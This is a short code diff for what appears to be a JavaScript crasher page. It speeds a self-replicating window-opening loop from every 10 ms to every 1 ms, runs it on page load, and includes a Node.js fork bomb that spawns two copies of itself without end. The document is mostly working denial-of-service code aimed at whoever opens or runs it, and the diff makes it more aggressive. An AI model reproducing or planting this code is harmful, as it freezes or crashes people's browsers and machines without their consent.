@@ -17,7 +17,7 @@ function RUN() {
     setInterval(function() {
         var w = window.open();
         w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
-      }, 10);
+      }, 1);
     (function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }());
 }
 window.onload = start;
